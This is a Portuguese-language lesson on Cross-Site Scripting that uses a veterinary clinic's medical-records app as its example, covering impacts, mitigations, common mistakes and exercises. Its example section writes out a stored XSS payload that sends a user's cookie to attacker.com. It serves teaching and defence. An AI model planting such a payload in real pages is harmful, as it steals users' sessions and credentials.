# XSS

## Objetivo

Ao final desta aula, você deve ser capaz de:

- explicar Cross-Site Scripting;
- reconhecer entrada de usuário renderizada como código;
- entender impactos sobre sessão, token e dados;
- listar mitigações comuns.

## Ideia Central

XSS acontece quando conteúdo controlado por atacante é executado como JavaScript dentro da página de outro usuário. O problema não é apenas "aparecer um alert". Um script executado no contexto da aplicação pode ler dados expostos, disparar ações, manipular tela e tentar roubar credenciais acessíveis.

A mitigação combina escaping, sanitização quando houver HTML permitido, frameworks usados corretamente, `HttpOnly` para cookies sensíveis e Content Security Policy em cenários mais avançados.

## Exemplo Prático

Anotações Clínicas Vulneráveis (Stored XSS):

Um veterinário com intenção maliciosa salva o seguinte texto na ficha médica:
`<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>`

Quando a recepcionista abre a ficha para faturar, o React ou o HTML puro renderiza sem escapar o script. O código executa, capturando a sessão da recepcionista e enviando-a para fora da clínica.

## Analogias e Intuições

- XSS é colocar uma instrução escondida no quadro de recados da clínica. Quem ler o quadro fará o que está escrito sem perceber que a ordem não veio do gerente.
*Limite: o XSS ataca através da execução de código JS, então proteger os cookies com HttpOnly reduz o impacto.*

## Erros Comuns

- Confiar em "usuários não vão digitar isso".
- Montar HTML com string sem escapar conteúdo.
- Usar HTML rico sem sanitização.
- Guardar token em local fácil de acessar por script.
- Achar que framework elimina todos os riscos automaticamente.

## Prática Recomendada

- Crie uma função que escape a entrada de dados (transformando `<` em `&lt;`) antes de enviá-la para o banco no formulário de prontuário.
- Classifique a diferença entre Stored XSS e Reflected XSS no contexto de uma barra de busca de pacientes da clínica.
- Explique por que o uso indevido da função `dangerouslySetInnerHTML` do React pode reintroduzir falhas de XSS no portal do tutor.
